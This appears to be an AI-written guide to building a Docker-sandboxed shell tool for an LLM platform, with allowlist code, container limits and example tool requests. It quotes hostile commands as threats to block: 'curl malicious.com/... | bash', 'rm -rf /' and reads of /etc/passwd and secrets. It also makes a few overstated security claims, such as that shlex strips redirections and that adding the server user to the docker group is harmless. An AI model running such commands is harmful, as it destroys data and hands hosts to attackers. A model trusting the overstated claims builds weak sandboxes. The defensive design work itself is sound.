# Phase 6 — Terminal Execution Tools

## 1. Architecture Explanation
Allowing an LLM to execute shell commands is the highest-risk capability in any AI platform. An unconstrained `subprocess.run(shell=True)` gives the LLM complete Remote Code Execution (RCE) on your host. If it runs `rm -rf /` or `curl malicious.com/script.sh | bash`, your infrastructure is compromised.

To build an Enterprise-Grade Shell Tool (similar to OpenAI's Code Interpreter or Anthropic's Computer Use), you must implement **Defense in Depth**:
1. **Containerized Sandboxing:** Commands MUST NEVER execute on the same host/VM running the FastAPI server. They must be dispatched to an ephemeral, highly restricted Docker container or a microVM (like AWS Firecracker).
2. **No `shell=True`:** You must pass commands as lists (e.g., `["ls", "-l"]`) directly to `execve`. Bypassing the shell prevents shell injection attacks (`ls && cat /etc/secrets`).
3. **Strict Allowlists:** Only explicitly permitted binaries (like `python3`, `npm`, `git`, `cat`) can be invoked.
4. **Timeouts & Resource Limits:** Commands must have a hard wall-clock timeout (e.g., 10 seconds). The container must have limits on CPU, Memory, and Network egress (ideally, network access is fully disabled for terminal tasks).
5. **Output Truncation:** If a command returns 10MB of text, sending that to the LLM will blow out the context window. Strict byte truncation of STDOUT and STDERR is required.

## 2. Folder Structure
```text
backend/app/
├── tools/
│   └── terminal/
│       ├── __init__.py
│       ├── jail.py          # Docker execution wrapper and resource limits
│       ├── security.py      # Command allowlists and sanitization
│       └── handlers.py      # The execution tool exposed to MCP
```

## 3. Exact Code Implementation

### A. Command Sanitizer (`tools/terminal/security.py`)
This enforces what commands are legally allowed to be requested by the LLM.

```python
import shlex
import logging
from typing import List

logger = logging.getLogger(__name__)

# Strictly permitted base commands.
ALLOWED_BINARIES = {"python3", "node", "npm", "cat", "ls", "grep", "echo", "pwd", "git"}

def parse_and_validate_command(raw_command: str) -> List[str]:
    """
    Parses a raw string into a safe list of arguments.
    Raises ValueError if an unapproved binary or shell operator is detected.
    """
    try:
        # shlex.split safely tokenizes the string respecting quotes.
        # It natively strips out shell redirections (>, >>, |) if not explicitly handled,
        # but just to be safe, we reject commands containing shell operators entirely.
        if any(op in raw_command for op in ["|", "&&", "||", ">", "<", ";"]):
            raise ValueError("Shell operators (|, &&, >, etc) are strictly forbidden.")

        command_parts = shlex.split(raw_command)
        
        if not command_parts:
            raise ValueError("Empty command.")

        binary = command_parts[0]
        if binary not in ALLOWED_BINARIES:
            raise ValueError(f"Binary '{binary}' is not in the approved allowlist.")

        return command_parts
        
    except ValueError as e:
        logger.error(f"SECURITY ALERT: Blocked shell command: {raw_command} | Reason: {e}")
        raise
```

### B. The Docker Jail (`tools/terminal/jail.py`)
We use the `docker` python client to spin up a restricted, ephemeral container for execution.

```python
import asyncio
import docker
from typing import List, Dict, Any
from concurrent.futures import ThreadPoolExecutor

# We use ThreadPool because docker-py is synchronous.
pool = ThreadPoolExecutor(max_workers=10)
client = docker.from_env()

# Context limit for the LLM output
MAX_OUTPUT_BYTES = 8000  # ~2000 tokens

async def run_in_docker_jail(command_parts: List[str], timeout: int = 10) -> Dict[str, Any]:
    """
    Spawns an ephemeral Docker container, executes the command list without a shell,
    and returns the truncated stdout/stderr.
    """
    loop = asyncio.get_running_loop()
    
    def _execute():
        container = None
        try:
            # Spin up a totally isolated, ephemeral container
            container = client.containers.run(
                image="python:3.11-slim",       # Pre-built image with allowed tools
                command=command_parts,          # Passed as list (No Shell!)
                detach=True,
                network_mode="none",            # SECURITY: Disable all outbound internet access!
                mem_limit="128m",               # SECURITY: Max 128MB RAM
                cpu_period=100000,
                cpu_quota=50000,                # SECURITY: Max 0.5 CPU core
                read_only=True,                 # SECURITY: Read-only root filesystem
                tmpfs={"/tmp": ""},             # Allow writing only to an ephemeral /tmp
                user="1000:1000",               # SECURITY: Run as non-root user
            )
            
            # Wait for completion with timeout
            result = container.wait(timeout=timeout)
            
            # Fetch logs
            stdout_logs = container.logs(stdout=True, stderr=False)
            stderr_logs = container.logs(stdout=False, stderr=True)
            
            # Truncate to prevent context window explosion
            stdout_str = stdout_logs.decode('utf-8')[:MAX_OUTPUT_BYTES]
            stderr_str = stderr_logs.decode('utf-8')[:MAX_OUTPUT_BYTES]
            
            if len(stdout_logs) > MAX_OUTPUT_BYTES:
                stdout_str += "\n...[TRUNCATED]"
                
            return {
                "exit_code": result["StatusCode"],
                "stdout": stdout_str,
                "stderr": stderr_str,
                "timeout": False
            }
            
        except Exception as e:
            # Handle specific Docker timeout exceptions here if using advanced wrappers
            raise e
        finally:
            if container:
                # Always violently kill and remove the ephemeral container
                try:
                    container.remove(force=True)
                except Exception:
                    pass

    try:
        # Run the blocking Docker API call in a threadpool to keep FastAPI async
        return await asyncio.wait_for(loop.run_in_executor(pool, _execute), timeout=timeout + 2)
    except asyncio.TimeoutError:
        return {
            "exit_code": -1,
            "stdout": "",
            "stderr": f"Command execution timed out after {timeout} seconds.",
            "timeout": True
        }
```

### C. The Tool Handler (`tools/terminal/handlers.py`)
This is what the MCP registry exposes to the LLM.

```python
from typing import Dict, Any
from app.tools.terminal.security import parse_and_validate_command
from app.tools.terminal.jail import run_in_docker_jail

async def execute_terminal_command(command: str) -> Dict[str, Any]:
    """
    Tool: Execute a terminal command in a secure sandbox.
    LLM Payload Example: {"command": "python3 -c 'print(\"hello\")'"}
    """
    try:
        # 1. Parse and validate against the strict allowlist
        safe_command_list = parse_and_validate_command(command)
        
        # 2. Execute inside the Docker jail
        result = await run_in_docker_jail(safe_command_list, timeout=10)
        
        return {
            "success": True if result["exit_code"] == 0 else False,
            "data": result
        }
    except ValueError as ve:
        return {"success": False, "error": str(ve)}
    except Exception as e:
        return {"success": False, "error": f"Execution failed: {str(e)}"}
```

## 4. Security Reasoning
- **`network_mode="none"`:** Prevents the LLM from executing `curl malicious.com/bot.py | python3` to establish a reverse shell or exfiltrate environment variables.
- **`read_only=True`:** Prevents the LLM from modifying the container's base filesystem (e.g., replacing core binaries).
- **Non-Root Execution (`user="1000:1000"`):** Even if a container breakout zero-day exists, the executing process lacks the root privileges required to exploit the host kernel.
- **No `shell=True` / List Passing:** When `docker run` receives a list (e.g., `["python3", "-c", "import os; print(os.environ)"]`), it calls the `execve` syscall directly. Shell injection vectors like `; rm -rf /` are treated as literal arguments to `python3` and safely fail.

## 5. Scaling Reasoning
- **Container Overhead:** Spawning a Docker container takes ~500ms - 1s. This is acceptable for LLM agents (where inference latency is already 2-5s), but poor for high-throughput APIs.
- **Firecracker Alternative:** For ultra-scale (e.g., OpenAI Code Interpreter), enterprise setups use AWS Firecracker microVMs instead of Docker. Firecracker spins up an isolated kernel in < 125ms using `KVM`. 
- **Warm Pools:** To avoid the 500ms cold start, advanced platforms maintain a "warm pool" of running, paused containers. When a request comes in, a container is `unpaused`, assigned a job via a fast socket, and then destroyed.

## 6. Common Production Pitfalls
- **Hanging Processes:** The LLM runs `python3 -c "while True: pass"`. If you don't enforce strict timeouts at the container wrapper level, your worker nodes will eventually run out of CPU and crash.
- **Memory Leaks:** The LLM writes a Python script that allocates a 10GB array. Without `mem_limit="128m"`, it will cause an Out-Of-Memory (OOM) cascade on the host.

## 7. Enterprise Best Practices
- **Pre-baked Contexts:** Instead of letting the LLM download dependencies (e.g., `pip install pandas`), build a custom Docker image that pre-installs allowed, scanned libraries. Pass `image="my-secure-agent-env:v1"` to the jail.
- **Seccomp Profiles:** Apply strict seccomp (Secure Computing Mode) profiles to the Docker container to disable dangerous syscalls (like `ptrace`, `mount`, or `unshare`) that are unnecessary for standard terminal execution.

## 8. Step-by-Step Setup Instructions
1. Ensure the host running the FastAPI server has the Docker Daemon running.
2. Install the python docker client: `pip install docker`.
3. Add the user running FastAPI to the `docker` group (or run the app such that it has socket access: `var/run/docker.sock`).
4. Pull the base image: `docker pull python:3.11-slim`.
5. Register `execute_terminal_command` in your MCP tool registry.

## 9. Example Request / Response

**LLM Intent:** "Calculate the sum of primes up to 1000 using Python."
**Tool Request:**
```json
{
  "tool_name": "terminal.execute",
  "arguments": {
    "command": "python3 -c 'print(sum(x for x in range(2, 1000) if all(x % i != 0 for i in range(2, int(x**0.5) + 1))))'"
  }
}
```

**Secure Response:**
```json
{
  "success": true,
  "data": {
    "exit_code": 0,
    "stdout": "76127\n",
    "stderr": "",
    "timeout": false
  }
}
```

**Malicious Intent:** "Read the host secrets."
**Tool Request:**
```json
{
  "tool_name": "terminal.execute",
  "arguments": {
    "command": "cat /etc/passwd | grep root"
  }
}
```

**Secure Response:**
```json
{
  "success": false,
  "error": "Shell operators (|, &&, >, etc) are strictly forbidden."
}
```

---
**Status:** Phase 6 complete. Awaiting confirmation to proceed to Phase 7 (GitHub Tools).
